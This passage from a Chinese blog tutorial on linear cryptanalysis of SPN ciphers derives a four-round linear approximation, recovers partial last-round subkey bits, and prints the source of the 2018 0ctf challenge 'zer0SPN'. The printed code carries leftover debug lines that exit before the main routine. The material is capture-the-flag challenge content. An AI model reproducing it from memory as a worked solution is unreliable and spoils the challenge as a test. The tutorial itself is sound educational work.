<p>带入第一轮的数据，有：$V_{2,6} \oplus V_{2,8} \oplus P_5 \oplus P_7 \oplus P_8 \oplus K_{1,5}  \oplus K_{1,7}  \oplus K_{1,8} \oplus K_{2,6} =0 $  (3)</p>
<p>(2)式的概率偏差是1/4，概率为3/4，带入(3)式有其概率为： 1/2+2(3/4-1/2)(1/4-1/2)=3/8  (偏差-1/8)</p>
<p>第三轮：$V_{3,6} \oplus V_{3,8} = U_{3,6} = V_{2,6} \oplus K_{3,6}$</p>
<p>$V_{3,14} \oplus V_{3,16} = U_{3,14} = V_{2,8} \oplus K_{3,14}$</p>
<p>带入之后有： $V_{3,6} \oplus V_{3,8} \oplus V_{3,14} \oplus V_{3,16} \oplus V_{2,6} \oplus K_{3,6} \oplus V_{2,8} \oplus K_{3,14} = 0$   (4)</p>
<p>(4)式的概率为 1/2+2(1/4-1/2)(1/4-1/2) = 5/8 (偏差为1/8)</p>
<p>结合(3)、(4)式，我们有： $V_{3,6} \oplus V_{3,8} \oplus V_{3,14} \oplus V_{3,16} \oplus P_5 \oplus P_7 \oplus P_8 \oplus K_{1,5}  \oplus K_{1,7}  \oplus K_{1,8}  \oplus K_{2,6} \oplus  K_{3,6} \oplus K_{3,14} = 0$ </p>
<p>第四轮：由$U_{4,6} = V_{3,6} \oplus K_{4,6}$，$U_{4,8} = V_{3,14} \oplus K_{4,8}$， $U_{4,14}=V_{3,8} \oplus K_{4,14}$ ，$U_{4,16} = V_{3,16} \oplus K_{4,16}$</p>
<p>我们有：$U_{4,6} \oplus U_{4,8} \oplus U_{4,14} \oplus U_{4,16} \oplus  P_5 \oplus P_7 \oplus P_8 \oplus \sum_K = 0$ </p>
<p>其中：$\sum_K = K_{1,5}  \oplus K_{1,7}  \oplus K_{1,8} \oplus K_{2,6} \oplus  K_{3,6} \oplus K_{3,14} \oplus K_{4,6}  \oplus K_{4,8}  \oplus K_{4,14} \oplus K_{4,16}$</p>
<p>其中$\sum_K$ 的值为0或1，并且由叠加原理，有其概率为 $1/2+2^3(3/4-1/2)(1/4-1/2)^3=15/32$  （偏差-1/32）</p>
<p>$U_{4,6} \oplus U_{4,8} \oplus U_{4,14} \oplus U_{4,16} \oplus  P_5 \oplus P_7 \oplus P_8 = 0$     （5）</p>
<p>第5轮：</p>
<h4 id="3-2-获取Key的各比特位的值"><a href="#3-2-获取Key的各比特位的值" class="headerlink" title="3.2 获取Key的各比特位的值"></a>3.2 获取Key的各比特位的值</h4><p>上面之所以不进行第5轮的计算，是因为若R-1轮线性分析后，从密文反推会更为容易。</p>
<p>对于给出对应位置的部分目标子密钥$[K_{5,5} ... K_{5,8}, K_{5,13} ... K_{5,16}]$，解密出对应的密文得到$[V_{4,5} ... V_{4,8}, V_{4,13} ... V_{4,16}]$。通过S和的逆变换，我们可以求解出$[U_{4,5} ... U_{4,8}, U_{4,13} ... U_{4,16}]$ 。然后依据（5）式，可以算出符合该线性表达式的次数。</p>
<p>之所以可以使用这种方法，是因为如果部分目标子密钥正确，那么（5）式成立的概率将会与1/2有很大不同。而其他不正确的子密钥，将会造成（5）式概率接近于1/2。</p>
<p>(5)式影响S盒$S_{42}$ 和 $S_{44}$ 的输入。对于每对明密文对，我们将会尝试256种可能的部分目标子密钥$[K_{5,5} ... K_{5,8}, K_{5,13} ... K_{5,16}]$ 。对于每种可能的部分子密钥，我们都会求出(5)式为真时的次数。这些次数偏离最远的就是正确的解，当然不用管这些次数是正向偏移还是逆向偏移（其取决于$\sum_K$）。</p>
<p>当$\sum_K=0$ 时，（5）式成立的概率 &lt; 1/2</p>
<p>当$\sum_K=1$ 时，（5）式成立的概率 &gt; 1/2</p>
<p>我们测试了10000组已知明密文对，用下列公式计算偏移：</p>
<p>$|bias| = |count - 5000|/10000$</p>
<p>最终得到下面的表格：</p>
<p><img src="\images\2018-04-03\6.png" alt=""></p>
<p>根据表格可以看出$[K_{5,5} ... K_{5,8}]=0010, [K_{5,13} ... K_{5,16}]=0100$ 时，偏移概率最大，为0.0336。其实1/32=0.03125。注意到这些之后，我们可以肯定这两部分的密钥值就是这些。</p>
<p>而直到这两部分的值之后，我们完全可以爆破求解另外两部分的密钥（如果密钥是可以反向求解的！）</p>
<h4 id="3-3-攻击的复杂度"><a href="#3-3-攻击的复杂度" class="headerlink" title="3.3 攻击的复杂度"></a>3.3 攻击的复杂度</h4><p>成功原因：如果S盒偏差越大，线性分析的偏差也会越大。</p>
<p>设$\epsilon$ 为线性表达式距离1/2的偏差，Matsui表示要使攻击成功，那么已知明文的数量要与$\epsilon^-2$ 的数量成正比。</p>
<p>如果$N_L$ 表示线性表达式需要的已知明文数量，则有 $N_L \approx 1/\epsilon^2$</p>
<p>由于偏差使用线性叠加的方式来计算的，所以很容易看出偏差依赖于S盒的线性近似表达式和触发的S盒数量。</p>
<h3 id="0x04-范例"><a href="#0x04-范例" class="headerlink" title="0x04 范例"></a>0x04 范例</h3><p>既然讲到了线性分析法，那么我们就必须使用其进行解题。下面是2018 0ctf的一道题，zer0SPN</p>
<p>zer0SPN.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># coding=utf-8</span></div><div class="line"></div><div class="line"><span class="comment">#from secret import secret</span></div><div class="line"></div><div class="line">rcon = [<span class="number">0x8d</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x04</span>, <span class="number">0x08</span>, <span class="number">0x10</span>, <span class="number">0x20</span>, <span class="number">0x40</span>, <span class="number">0x80</span>, <span class="number">0x1b</span>, <span class="number">0x36</span>, <span class="number">0x6c</span>, <span class="number">0xd8</span>, <span class="number">0xab</span>, <span class="number">0x4d</span>, <span class="number">0x9a</span>]</div><div class="line">sbox = [<span class="number">62</span>, <span class="number">117</span>, <span class="number">195</span>, <span class="number">179</span>, <span class="number">20</span>, <span class="number">210</span>, <span class="number">41</span>, <span class="number">66</span>, <span class="number">116</span>, <span class="number">178</span>, <span class="number">152</span>, <span class="number">143</span>, <span class="number">75</span>, <span class="number">105</span>, <span class="number">254</span>, <span class="number">1</span>, <span class="number">158</span>, <span class="number">95</span>, <span class="number">101</span>, <span class="number">175</span>, <span class="number">191</span>, <span class="number">166</span>, <span class="number">36</span>, <span class="number">24</span>, <span class="number">50</span>, <span class="number">39</span>, <span class="number">190</span>, <span class="number">120</span>, <span class="number">52</span>, <span class="number">242</span>, <span class="number">182</span>, <span class="number">185</span>, <span class="number">61</span>, <span class="number">225</span>, <span class="number">140</span>, <span class="number">38</span>, <span class="number">150</span>, <span class="number">80</span>, <span class="number">19</span>, <span class="number">109</span>, <span class="number">246</span>, <span class="number">252</span>, <span class="number">40</span>, <span class="number">13</span>, <span class="number">65</span>, <span class="number">236</span>, <span class="number">124</span>, <span class="number">186</span>, <span class="number">214</span>, <span class="number">86</span>, <span class="number">235</span>, <span class="number">100</span>, <span class="number">97</span>, <span class="number">49</span>, <span class="number">197</span>, <span class="number">154</span>, <span class="number">176</span>, <span class="number">199</span>, <span class="number">253</span>, <span class="number">69</span>, <span class="number">88</span>, <span class="number">112</span>, <span class="number">139</span>, <span class="number">77</span>, <span class="number">184</span>, <span class="number">45</span>, <span class="number">133</span>, <span class="number">104</span>, <span class="number">15</span>, <span class="number">54</span>, <span class="number">177</span>, <span class="number">244</span>, <span class="number">160</span>, <span class="number">169</span>, <span class="number">82</span>, <span class="number">148</span>, <span class="number">73</span>, <span class="number">30</span>, <span class="number">229</span>, <span class="number">35</span>, <span class="number">79</span>, <span class="number">137</span>, <span class="number">157</span>, <span class="number">180</span>, <span class="number">248</span>, <span class="number">163</span>, <span class="number">241</span>, <span class="number">231</span>, <span class="number">81</span>, <span class="number">94</span>, <span class="number">165</span>, <span class="number">9</span>, <span class="number">162</span>, <span class="number">233</span>, <span class="number">18</span>, <span class="number">85</span>, <span class="number">217</span>, <span class="number">84</span>, <span class="number">7</span>, <span class="number">55</span>, <span class="number">63</span>, <span class="number">171</span>, <span class="number">56</span>, <span class="number">118</span>, <span class="number">237</span>, <span class="number">132</span>, <span class="number">136</span>, <span class="number">22</span>, <span class="number">90</span>, <span class="number">221</span>, <span class="number">103</span>, <span class="number">161</span>, <span class="number">205</span>, <span class="number">11</span>, <span class="number">255</span>, <span class="number">14</span>, <span class="number">122</span>, <span class="number">47</span>, <span class="number">71</span>, <span class="number">201</span>, <span class="number">99</span>, <span class="number">220</span>, <span class="number">83</span>, <span class="number">74</span>, <span class="number">173</span>, <span class="number">76</span>, <span class="number">144</span>, <span class="number">16</span>, <span class="number">155</span>, <span class="number">126</span>, <span class="number">60</span>, <span class="number">96</span>, <span class="number">44</span>, <span class="number">234</span>, <span class="number">17</span>, <span class="number">215</span>, <span class="number">107</span>, <span class="number">138</span>, <span class="number">159</span>, <span class="number">183</span>, <span class="number">251</span>, <span class="number">3</span>, <span class="number">198</span>, <span class="number">0</span>, <span class="number">89</span>, <span class="number">170</span>, <span class="number">131</span>, <span class="number">151</span>, <span class="number">219</span>, <span class="number">29</span>, <span class="number">230</span>, <span class="number">32</span>, <span class="number">187</span>, <span class="number">125</span>, <span class="number">134</span>, <span class="number">64</span>, <span class="number">12</span>, <span class="number">202</span>, <span class="number">164</span>, <span class="number">247</span>, <span class="number">25</span>, <span class="number">223</span>, <span class="number">222</span>, <span class="number">119</span>, <span class="number">174</span>, <span class="number">67</span>, <span class="number">147</span>, <span class="number">146</span>, <span class="number">206</span>, <span class="number">51</span>, <span class="number">243</span>, <span class="number">53</span>, <span class="number">121</span>, <span class="number">239</span>, <span class="number">68</span>, <span class="number">130</span>, <span class="number">70</span>, <span class="number">203</span>, <span class="number">211</span>, <span class="number">111</span>, <span class="number">108</span>, <span class="number">113</span>, <span class="number">8</span>, <span class="number">106</span>, <span class="number">57</span>, <span class="number">240</span>, <span class="number">21</span>, <span class="number">93</span>, <span class="number">142</span>, <span class="number">238</span>, <span class="number">167</span>, <span class="number">5</span>, <span class="number">128</span>, <span class="number">72</span>, <span class="number">189</span>, <span class="number">192</span>, <span class="number">193</span>, <span class="number">92</span>, <span class="number">10</span>, <span class="number">204</span>, <span class="number">87</span>, <span class="number">145</span>, <span class="number">188</span>, <span class="number">172</span>, <span class="number">224</span>, <span class="number">226</span>, <span class="number">207</span>, <span class="number">27</span>, <span class="number">218</span>, <span class="number">48</span>, <span class="number">33</span>, <span class="number">28</span>, <span class="number">123</span>, <span class="number">6</span>, <span class="number">37</span>, <span class="number">59</span>, <span class="number">4</span>, <span class="number">102</span>, <span class="number">114</span>, <span class="number">91</span>, <span class="number">23</span>, <span class="number">209</span>, <span class="number">34</span>, <span class="number">42</span>, <span class="number">2</span>, <span class="number">196</span>, <span class="number">141</span>, <span class="number">208</span>, <span class="number">181</span>, <span class="number">245</span>, <span class="number">43</span>, <span class="number">78</span>, <span class="number">213</span>, <span class="number">216</span>, <span class="number">232</span>, <span class="number">46</span>, <span class="number">98</span>, <span class="number">26</span>, <span class="number">212</span>, <span class="number">58</span>, <span class="number">115</span>, <span class="number">194</span>, <span class="number">200</span>, <span class="number">129</span>, <span class="number">227</span>, <span class="number">249</span>, <span class="number">127</span>, <span class="number">149</span>, <span class="number">135</span>, <span class="number">228</span>, <span class="number">31</span>, <span class="number">153</span>, <span class="number">250</span>, <span class="number">156</span>, <span class="number">168</span>, <span class="number">110</span>]</div><div class="line">ptable = [</div><div class="line">    <span class="number">0</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">24</span>, <span class="number">32</span>, <span class="number">40</span>, <span class="number">48</span>, <span class="number">56</span>,</div><div class="line">    <span class="number">1</span>, <span class="number">9</span>, <span class="number">17</span>, <span class="number">25</span>, <span class="number">33</span>, <span class="number">41</span>, <span class="number">49</span>, <span class="number">57</span>,</div><div class="line">    <span class="number">2</span>, <span class="number">10</span>, <span class="number">18</span>, <span class="number">26</span>, <span class="number">34</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">58</span>,</div><div class="line">    <span class="number">3</span>, <span class="number">11</span>, <span class="number">19</span>, <span class="number">27</span>, <span class="number">35</span>, <span class="number">43</span>, <span class="number">51</span>, <span class="number">59</span>,</div><div class="line">    <span class="number">4</span>, <span class="number">12</span>, <span class="number">20</span>, <span class="number">28</span>, <span class="number">36</span>, <span class="number">44</span>, <span class="number">52</span>, <span class="number">60</span>,</div><div class="line">    <span class="number">5</span>, <span class="number">13</span>, <span class="number">21</span>, <span class="number">29</span>, <span class="number">37</span>, <span class="number">45</span>, <span class="number">53</span>, <span class="number">61</span>,</div><div class="line">    <span class="number">6</span>, <span class="number">14</span>, <span class="number">22</span>, <span class="number">30</span>, <span class="number">38</span>, <span class="number">46</span>, <span class="number">54</span>, <span class="number">62</span>,</div><div class="line">    <span class="number">7</span>, <span class="number">15</span>, <span class="number">23</span>, <span class="number">31</span>, <span class="number">39</span>, <span class="number">47</span>, <span class="number">55</span>, <span class="number">63</span></div><div class="line">]</div><div class="line">sbox_inv = [<span class="number">143</span>, <span class="number">15</span>, <span class="number">224</span>, <span class="number">141</span>, <span class="number">216</span>, <span class="number">191</span>, <span class="number">213</span>, <span class="number">98</span>, <span class="number">182</span>, <span class="number">91</span>, <span class="number">198</span>, <span class="number">113</span>, <span class="number">156</span>, <span class="number">43</span>, <span class="number">115</span>, <span class="number">68</span>, <span class="number">127</span>, <span class="number">134</span>, <span class="number">94</span>, <span class="number">38</span>, <span class="number">4</span>, <span class="number">186</span>, <span class="number">107</span>, <span class="number">220</span>, <span class="number">23</span>, <span class="number">160</span>, <span class="number">237</span>, <span class="number">207</span>, <span class="number">211</span>, <span class="number">149</span>, <span class="number">77</span>, <span class="number">250</span>, <span class="number">151</span>, <span class="number">210</span>, <span class="number">222</span>, <span class="number">79</span>, <span class="number">22</span>, <span class="number">214</span>, <span class="number">35</span>, <span class="number">25</span>, <span class="number">42</span>, <span class="number">6</span>, <span class="number">223</span>, <span class="number">230</span>, <span class="number">132</span>, <span class="number">65</span>, <span class="number">235</span>, <span class="number">117</span>, <span class="number">209</span>, <span class="number">53</span>, <span class="number">24</span>, <span class="number">169</span>, <span class="number">28</span>, <span class="number">171</span>, <span class="number">69</span>, <span class="number">99</span>, <span class="number">102</span>, <span class="number">184</span>, <span class="number">239</span>, <span class="number">215</span>, <span class="number">130</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">100</span>, <span class="number">155</span>, <span class="number">44</span>, <span class="number">7</span>, <span class="number">165</span>, <span class="number">174</span>, <span class="number">59</span>, <span class="number">176</span>, <span class="number">118</span>, <span class="number">193</span>, <span class="number">76</span>, <span class="number">123</span>, <span class="number">12</span>, <span class="number">125</span>, <span class="number">63</span>, <span class="number">231</span>, <span class="number">80</span>, <span class="number">37</span>, <span class="number">88</span>, <span class="number">74</span>, <span class="number">122</span>, <span class="number">97</span>, <span class="number">95</span>, <span class="number">49</span>, <span class="number">200</span>, <span class="number">60</span>, <span class="number">144</span>, <span class="number">108</span>, <span class="number">219</span>, <span class="number">197</span>, <span class="number">187</span>, <span class="number">89</span>, <span class="number">17</span>, <span class="number">131</span>, <span class="number">52</span>, <span class="number">236</span>, <span class="number">120</span>, <span class="number">51</span>, <span class="number">18</span>, <span class="number">217</span>, <span class="number">110</span>, <span class="number">67</span>, <span class="number">13</span>, <span class="number">183</span>, <span class="number">136</span>, <span class="number">180</span>, <span class="number">39</span>, <span class="number">255</span>, <span class="number">179</span>, <span class="number">61</span>, <span class="number">181</span>, <span class="number">218</span>, <span class="number">240</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">103</span>, <span class="number">163</span>, <span class="number">27</span>, <span class="number">172</span>, <span class="number">116</span>, <span class="number">212</span>, <span class="number">46</span>, <span class="number">153</span>, <span class="number">129</span>, <span class="number">246</span>, <span class="number">192</span>, <span class="number">243</span>, <span class="number">175</span>, <span class="number">146</span>, <span class="number">105</span>, <span class="number">66</span>, <span class="number">154</span>, <span class="number">248</span>, <span class="number">106</span>, <span class="number">81</span>, <span class="number">137</span>, <span class="number">62</span>, <span class="number">34</span>, <span class="number">226</span>, <span class="number">188</span>, <span class="number">11</span>, <span class="number">126</span>, <span class="number">201</span>, <span class="number">167</span>, <span class="number">166</span>, <span class="number">75</span>, <span class="number">247</span>, <span class="number">36</span>, <span class="number">147</span>, <span class="number">10</span>, <span class="number">251</span>, <span class="number">55</span>, <span class="number">128</span>, <span class="number">253</span>, <span class="number">82</span>, <span class="number">16</span>, <span class="number">138</span>, <span class="number">72</span>, <span class="number">111</span>, <span class="number">92</span>, <span class="number">85</span>, <span class="number">158</span>, <span class="number">90</span>, <span class="number">21</span>, <span class="number">190</span>, <span class="number">254</span>, <span class="number">73</span>, <span class="number">145</span>, <span class="number">101</span>, <span class="number">203</span>, <span class="number">124</span>, <span class="number">164</span>, <span class="number">19</span>, <span class="number">56</span>, <span class="number">70</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">83</span>, <span class="number">228</span>, <span class="number">30</span>, <span class="number">139</span>, <span class="number">64</span>, <span class="number">31</span>, <span class="number">47</span>, <span class="number">152</span>, <span class="number">202</span>, <span class="number">194</span>, <span class="number">26</span>, <span class="number">20</span>, <span class="number">195</span>, <span class="number">196</span>, <span class="number">241</span>, <span class="number">2</span>, <span class="number">225</span>, <span class="number">54</span>, <span class="number">142</span>, <span class="number">57</span>, <span class="number">242</span>, <span class="number">119</span>, <span class="number">157</span>, <span class="number">177</span>, <span class="number">199</span>, <span class="number">112</span>, <span class="number">168</span>, <span class="number">206</span>, <span class="number">227</span>, <span class="number">221</span>, <span class="number">5</span>, <span class="number">178</span>, <span class="number">238</span>, <span class="number">232</span>, <span class="number">48</span>, <span class="number">135</span>, <span class="number">233</span>, <span class="number">96</span>, <span class="number">208</span>, <span class="number">148</span>, <span class="number">121</span>, <span class="number">109</span>, <span class="number">162</span>, <span class="number">161</span>, <span class="number">204</span>, <span class="number">33</span>, <span class="number">205</span>, <span class="number">244</span>, <span class="number">249</span>, <span class="number">78</span>, <span class="number">150</span>, <span class="number">87</span>, <span class="number">234</span>, <span class="number">93</span>, <span class="number">133</span>, <span class="number">50</span>, <span class="number">45</span>, <span class="number">104</span>, <span class="number">189</span>, <span class="number">173</span>, <span class="number">185</span>, <span class="number">86</span>, <span class="number">29</span>, <span class="number">170</span>, <span class="number">71</span>, <span class="number">229</span>, <span class="number">40</span>, <span class="number">159</span>, <span class="number">84</span>, <span class="number">245</span>, <span class="number">252</span>, <span class="number">140</span>, <span class="number">41</span>, <span class="number">58</span>, <span class="number">14</span>, <span class="number">114</span>]</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">s2b</span><span class="params">(s)</span>:</span></div><div class="line">    <span class="keyword">return</span> map(int, format(int(str(s).encode(<span class="string">'hex'</span>), <span class="number">16</span>), <span class="string">'0&#123;&#125;b'</span>.format(<span class="number">8</span>*len(s))))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">b2s</span><span class="params">(b)</span>:</span></div><div class="line">    <span class="keyword">return</span> bytearray.fromhex(format(reduce(<span class="keyword">lambda</span> x,y: <span class="number">2</span>*x+y, b), <span class="string">'0&#123;&#125;x'</span>.format(len(b)/<span class="number">4</span>)))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">addkey</span><span class="params">(a, b)</span>:</span></div><div class="line">    <span class="keyword">global</span> flag</div><div class="line">    <span class="keyword">return</span> bytearray(i^j <span class="keyword">for</span> i,j <span class="keyword">in</span> zip(a, b))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">substitute</span><span class="params">(a)</span>:</span></div><div class="line">    <span class="keyword">return</span> bytearray(sbox[i] <span class="keyword">for</span> i <span class="keyword">in</span> a)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">permutation</span><span class="params">(a)</span>:</span></div><div class="line">    <span class="keyword">assert</span> len(a) == <span class="number">8</span></div><div class="line">    bits = s2b(a)</div><div class="line">    bits = [bits[ptable[i]] <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">64</span>)]</div><div class="line">    <span class="keyword">return</span> b2s(bits)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">substitute_inv</span><span class="params">(a)</span>:</span></div><div class="line">    <span class="keyword">return</span> bytearray(sbox_inv[i] <span class="keyword">for</span> i <span class="keyword">in</span> a)</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">zer0SPN</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="string">'''0ops Substitution–Permutation Network'''</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, key, key_size=<span class="number">8</span>, rounds=<span class="number">4</span>)</span>:</span></div><div class="line">        <span class="keyword">assert</span> len(key) == key_size</div><div class="line">        self.key = key</div><div class="line">        self.key_size = key_size</div><div class="line">        self.rounds = rounds</div><div class="line">        self.key_schedule()</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">key_schedule</span><span class="params">(self)</span>:</span></div><div class="line">        roundkey = bytearray(self.key)</div><div class="line">        tmp = roundkey[<span class="number">-4</span>:]</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>, self.rounds+<span class="number">1</span>):</div><div class="line">            tmp = tmp[<span class="number">1</span>:] + tmp[:<span class="number">1</span>]</div><div class="line">            tmp = bytearray(sbox[i] <span class="keyword">for</span> i <span class="keyword">in</span> tmp)</div><div class="line">            tmp[<span class="number">0</span>] ^= rcon[i]</div><div class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(self.key_size/<span class="number">4</span>):</div><div class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line">                    tmp[k] ^= roundkey[-self.key_size+k]</div><div class="line">                roundkey += tmp</div><div class="line">        self.roundkey = roundkey</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_roundkey</span><span class="params">(self, k)</span>:</span></div><div class="line">        <span class="keyword">assert</span> k &lt;= self.rounds</div><div class="line">        <span class="keyword">return</span> self.roundkey[self.key_size*k:self.key_size*(k+<span class="number">1</span>)]</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(self, plain)</span>:</span></div><div class="line">        <span class="keyword">assert</span> len(plain) == self.key_size</div><div class="line">        block = bytearray(plain)</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(self.rounds):</div><div class="line">            block = addkey(block, self.get_roundkey(i))</div><div class="line">            block = substitute(block)</div><div class="line">            <span class="keyword">if</span> i != self.rounds - <span class="number">1</span>:</div><div class="line">                <span class="comment"># Permutation in the last round is of no purpose.</span></div><div class="line">                block = permutation(block)</div><div class="line">        block = addkey(block, self.get_roundkey(i+<span class="number">1</span>))</div><div class="line">        <span class="keyword">return</span> block</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">key_schedule</span><span class="params">(key)</span>:</span></div><div class="line">    rounds = <span class="number">4</span></div><div class="line">    key_size = <span class="number">8</span></div><div class="line">    roundkey = bytearray(key)</div><div class="line">    tmp = roundkey[<span class="number">-4</span>:]</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>, rounds+<span class="number">1</span>):</div><div class="line">        tmp = tmp[<span class="number">1</span>:] + tmp[:<span class="number">1</span>]</div><div class="line">        tmp = bytearray(sbox[i] <span class="keyword">for</span> i <span class="keyword">in</span> tmp)</div><div class="line">        tmp[<span class="number">0</span>] ^= rcon[i]</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(key_size/<span class="number">4</span>):</div><div class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line">                tmp[k] ^= roundkey[-key_size+k]</div><div class="line">            roundkey += tmp</div><div class="line">    roundkey = roundkey</div><div class="line">    <span class="keyword">return</span> roundkey</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">key_schedule_inv</span><span class="params">(last_key)</span>:</span></div><div class="line">    rounds = <span class="number">4</span></div><div class="line">    key_size = <span class="number">8</span></div><div class="line">    roundkey = bytearray(last_key)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(rounds, <span class="number">0</span>, <span class="number">-1</span>):</div><div class="line">        tmp = roundkey[<span class="number">4</span>:<span class="number">8</span>]</div><div class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">4</span>):</div><div class="line">            tmp[k] ^= roundkey[k]</div><div class="line">        roundkey = tmp+roundkey</div><div class="line">        tmp = roundkey[<span class="number">0</span>:<span class="number">4</span>]</div><div class="line">        tmp = tmp[<span class="number">1</span>:] + tmp[:<span class="number">1</span>]</div><div class="line">        tmp = bytearray(sbox[i] <span class="keyword">for</span> i <span class="keyword">in</span> tmp)</div><div class="line">        tmp[<span class="number">0</span>] ^= rcon[i]</div><div class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">4</span>):</div><div class="line">            tmp[k] ^= roundkey[<span class="number">4</span>+k]</div><div class="line">        roundkey = tmp + roundkey</div><div class="line">    roundkey = roundkey</div><div class="line">    <span class="keyword">return</span> roundkey</div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">255</span>):</div><div class="line">    <span class="keyword">print</span> sbox[i]^sbox[i+<span class="number">1</span>]</div><div class="line">exit(<span class="number">0</span>)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="keyword">from</span> os <span class="keyword">import</span> urandom</div><div class="line">    <span class="keyword">from</span> struct <span class="keyword">import</span> pack</div><div class="line">    <span class="keyword">import</span> binascii</div><div class="line"></div><div class="line">    <span class="keyword">print</span> <span class="string">"Your flag is flag&#123;%s&#125;"</span> % secret.encode(<span class="string">'hex'</span>)</div><div class="line">    f = open(<span class="string">'data'</span>, <span class="string">'wb'</span>)</div><div class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> xrange(<span class="number">65536</span>):</div><div class="line">        c = zer0SPN(secret)</div><div class="line">        plaintext = bytearray(urandom(<span class="number">8</span>))</div><div class="line">        f.write(pack(<span class="string">'8B'</span>, *plaintext))</div><div class="line">        ciphertext = c.encrypt(plaintext)</div><div class="line">        f.write(pack(<span class="string">'8B'</span>, *ciphertext))</div><div class="line">    f.close()</div></pre></td></tr></table></figure>
<p>使用下面脚本获取S盒的缺陷表达式：(find_linear_approxmation)</p>
